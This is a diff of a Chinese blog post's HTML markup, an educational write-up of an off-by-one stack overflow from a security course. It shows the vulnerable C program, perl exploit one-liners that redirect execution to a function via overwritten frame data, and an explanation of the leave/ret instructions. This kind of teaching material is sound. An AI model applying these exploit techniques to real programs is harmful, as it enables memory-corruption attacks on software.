@@ -6,32 +6,68 @@
 &lt;h1 id="off-by-one-溢出攻击分析">Off-by-One 溢出攻击分析
 &lt;/h1>&lt;h2 id="背景">背景
 &lt;/h2>&lt;p>上周，我参加了一门安全课程，其中包含了一个 off-by-one 溢出漏洞的示例。以下是原始代码：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/* 简单的 off-by-one 溢出示例 */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">1024&lt;/span>];
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strncpy&lt;/span>(buf, input, &lt;span style="color:#66d9ef">sizeof&lt;/span>(buf));
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf[&lt;span style="color:#66d9ef">sizeof&lt;/span>(buf)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">bar&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I&amp;#39;ve been hacked&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (argc &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Usage: %s input_string&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, argv[&lt;span style="color:#ae81ff">0&lt;/span>]);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(EXIT_FAILURE);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">foo&lt;/span>(argv[&lt;span style="color:#ae81ff">1&lt;/span>]);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用此漏洞的攻击命令是：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>perl -e &lt;span style="color:#e6db74">&amp;#39;system &amp;#34;./obo&amp;#34;, &amp;#34;\x38\x84\x04\x08&amp;#34;x256&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行此命令的结果是屏幕上打印出多行 &lt;code>I've been hacked&lt;/code>。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* 简单的 off-by-one 溢出示例 */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">foo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strncpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">bar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;I&amp;#39;ve been hacked&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage: %s input_string&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">foo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>利用此漏洞的攻击命令是：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">perl -e &lt;span class="s1">&amp;#39;system &amp;#34;./obo&amp;#34;, &amp;#34;\x38\x84\x04\x08&amp;#34;x256&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>运行此命令的结果是屏幕上打印出多行 &lt;code>I've been hacked&lt;/code>。&lt;/p>
 &lt;h2 id="分析">分析
 &lt;/h2>&lt;p>当程序进入 &lt;code>foo&lt;/code> 函数时，内存布局如下（使用 GDB 观察到）：&lt;/p>
 &lt;p>从上到下，布局包含返回地址、保存的帧指针（saved frame pointer）和缓冲区 (&lt;code>buf&lt;/code>)。&lt;/p>
@@ -40,17 +76,32 @@
 &lt;/h2>&lt;p>当 &lt;code>foo&lt;/code> 函数返回时，通常会执行以下关键的汇编指令：&lt;/p>
 &lt;h3 id="1-leave-指令">1. &lt;code>leave&lt;/code> 指令
 &lt;/h3>&lt;p>&lt;code>leave&lt;/code> 指令等价于：&lt;/p>
-&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">mov esp, ebp
-pop ebp
-&lt;/code>&lt;/pre>&lt;ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mov esp, ebp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pop ebp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
 &lt;li>&lt;code>mov esp, ebp&lt;/code>：将栈指针 (&lt;code>esp&lt;/code>) 设置为帧指针 (&lt;code>ebp&lt;/code>) 的值，恢复栈指针到当前栈帧的顶部，从而释放当前函数占用的空间。&lt;/li>
 &lt;li>&lt;code>pop ebp&lt;/code>：将栈顶的值弹出并赋给帧指针 (&lt;code>ebp&lt;/code>)，从而恢复调用者的帧指针。实际上，相当于将返回地址写入 &lt;code>ebp&lt;/code>，这意味着将栈中的值（通常是调用者的帧地址）赋给 &lt;code>ebp&lt;/code>，从而恢复调用者的栈帧。&lt;/li>
 &lt;/ul>
 &lt;p>&lt;code>leave&lt;/code> 的作用是将 &lt;code>esp&lt;/code> 恢复到函数调用前的位置，并弹出保存的 &lt;code>ebp&lt;/code>。如果 &lt;code>ebp&lt;/code> 被覆盖为指向某个特殊地址（例如缓冲区内的地址），在函数返回时可能导致错误的栈指针位置。&lt;/p>
 &lt;h3 id="2-ret-指令">2. &lt;code>ret&lt;/code> 指令
 &lt;/h3>&lt;p>&lt;code>ret&lt;/code> 指令从栈顶弹出一个地址并跳转到该地址：&lt;/p>
-&lt;pre tabindex="0">&lt;code class="language-assembly" data-lang="assembly">pop eip
-&lt;/code>&lt;/pre>&lt;p>如果返回地址被覆盖为 &lt;code>bar&lt;/code> 函数的地址，执行流将跳转到 &lt;code>bar&lt;/code>，允许攻击者执行任意代码。本质上，&lt;code>ret&lt;/code> 会将一个地址弹出到指令指针 (&lt;code>eip&lt;/code>) 并跳转到该地址继续执行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">pop eip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果返回地址被覆盖为 &lt;code>bar&lt;/code> 函数的地址，执行流将跳转到 &lt;code>bar&lt;/code>，允许攻击者执行任意代码。本质上，&lt;code>ret&lt;/code> 会将一个地址弹出到指令指针 (&lt;code>eip&lt;/code>) 并跳转到该地址继续执行。&lt;/p>
 &lt;h2 id="攻击步骤">攻击步骤
 &lt;/h2>&lt;ul>
 &lt;li>当执行命令 &lt;code>perl -e 'system &amp;quot;./obo&amp;quot;, &amp;quot;\x38\x84\x04\x08&amp;quot;x256'&lt;/code> 时，程序会将这些重复的字节作为输入传递给 &lt;code>./obo&lt;/code>。&lt;/li>
@@ -75,8 +126,15 @@ pop ebp
 &lt;/li>
 &lt;li>
 &lt;p>对应的偏移位置在 &lt;code>buf&lt;/code> 的第 255 个位置，这意味着可以通过只在该特定位置填入返回地址来构造攻击。在 GDB 中使用以下命令进行验证：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x254 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x1&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">r &lt;span class="k">$(&lt;/span>perl -e &lt;span class="s1">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x254 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x1&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;li>
 &lt;p>经过验证，这在 GDB 调试下是有效的，但需要注意以下细节：&lt;/p>
 &lt;ol>
@@ -86,7 +144,14 @@ pop ebp
 &lt;/li>
 &lt;li>
 &lt;p>直接执行程序时（即不使用 GDB），内存布局不同，导致偏移位置也不同。通过实验，发现偏移位置在第 235 个位置。对应的攻击命令是：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./obo &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x234 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x21&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./obo &lt;span class="k">$(&lt;/span>perl -e &lt;span class="s1">&amp;#39;print &amp;#34;\x01\x01\x01\x01&amp;#34;x234 . &amp;#34;\x38\x84\x04\x08&amp;#34;x1 . &amp;#34;\x01\x01\x01\x01&amp;#34;x21&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
 &lt;/ul>
 &lt;p>这样就实现了找到准确覆盖位置并成功执行攻击的效果。&lt;/p></description></item></channel></rss>
